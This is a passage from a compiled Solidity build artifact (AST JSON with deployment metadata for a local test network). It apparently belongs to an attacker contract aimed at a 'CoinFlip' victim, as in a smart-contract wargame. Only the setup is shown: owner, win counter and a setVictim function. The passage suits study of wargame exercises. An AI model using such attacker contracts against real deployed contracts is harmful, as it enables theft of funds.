                      "name": "consecutiveWins",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 95,
                      "src": "562:15:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "hexValue": "30",
                      "id": 108,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "580:1:1",
                      "subdenomination": null,
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_0_by_1",
                        "typeString": "int_const 0"
                      },
                      "value": "0"
                    },
                    "src": "562:19:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 110,
                  "nodeType": "ExpressionStatement",
                  "src": "562:19:1"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 114,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 111,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 97,
                      "src": "592:5:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "expression": {
                        "argumentTypes": null,
                        "id": 112,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 400,
                        "src": "600:3:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 113,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "600:10:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      }
                    },
                    "src": "592:18:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 115,
                  "nodeType": "ExpressionStatement",
                  "src": "592:18:1"
                }
              ]
            },
            "documentation": null,
            "id": 117,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 105,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "541:2:1"
            },
            "returnParameters": {
              "id": 106,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "551:0:1"
            },
            "scope": 138,
            "src": "530:88:1",
            "stateMutability": "nonpayable",
            "superFunction": null,
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 119,
            "name": "victimContract",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "626:30:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_CoinFlip_$86",
              "typeString": "contract CoinFlip"
            },
            "typeName": {
              "contractScope": null,
              "id": 118,
              "name": "CoinFlip",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 86,
              "src": "626:8:1",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_CoinFlip_$86",
                "typeString": "contract CoinFlip"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "body": {
              "id": 136,
              "nodeType": "Block",
              "src": "983:361:1",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 130,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 126,
                      "name": "victimContract",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 119,
                      "src": "1263:14:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_CoinFlip_$86",
                        "typeString": "contract CoinFlip"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "id": 128,
                          "name": "_addr",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 121,
                          "src": "1289:5:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 127,
                        "name": "CoinFlip",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 86,
                        "src": "1280:8:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_CoinFlip_$86_$",
                          "typeString": "type(contract CoinFlip)"
                        }
                      },
                      "id": 129,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1280:15:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_CoinFlip_$86",
                        "typeString": "contract CoinFlip"
                      }
                    },
                    "src": "1263:32:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_CoinFlip_$86",
                      "typeString": "contract CoinFlip"
                    }
                  },
                  "id": 131,
                  "nodeType": "ExpressionStatement",
                  "src": "1263:32:1"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "id": 133,
                        "name": "victimContract",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 119,
                        "src": "1321:14:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_CoinFlip_$86",
                          "typeString": "contract CoinFlip"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_contract$_CoinFlip_$86",
                          "typeString": "contract CoinFlip"
                        }
                      ],
                      "id": 132,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "nodeType": "ElementaryTypeNameExpression",
                      "src": "1313:7:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_type$_t_address_$",
                        "typeString": "type(address)"
                      },
                      "typeName": "address"
                    },
                    "id": 134,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "typeConversion",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1313:23:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "functionReturnParameters": 125,
                  "id": 135,
                  "nodeType": "Return",
                  "src": "1306:30:1"
                }
              ]
            },
            "documentation": null,
            "id": 137,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "setVictim",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 122,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 121,
                  "name": "_addr",
                  "nodeType": "VariableDeclaration",
                  "scope": 137,
                  "src": "943:13:1",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 120,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "943:7:1",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "942:15:1"
            },
            "returnParameters": {
              "id": 125,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 124,
                  "name": "",
                  "nodeType": "VariableDeclaration",
                  "scope": 137,
                  "src": "974:7:1",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 123,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "974:7:1",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "973:9:1"
            },
            "scope": 138,
            "src": "924:420:1",
            "stateMutability": "nonpayable",
            "superFunction": null,
            "visibility": "public"
          }
        ],
        "scope": 139,
        "src": "209:2333:1"
      }
    ],
    "src": "33:2511:1"
  },
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "networks": {
    "5777": {
      "events": {},
      "links": {},
      "address": "0xA469833ecB42ba2Fc1FC5ECeD81b023852799544",
      "transactionHash": "0x9b7aa98eb30b50ffde4e82a5db3193125be8eb6a4a229b3b516f23164e4adb4d"
    }
  },
  "schemaVersion": "3.2.3",
  "updatedAt": "2020-08-13T18:54:01.175Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}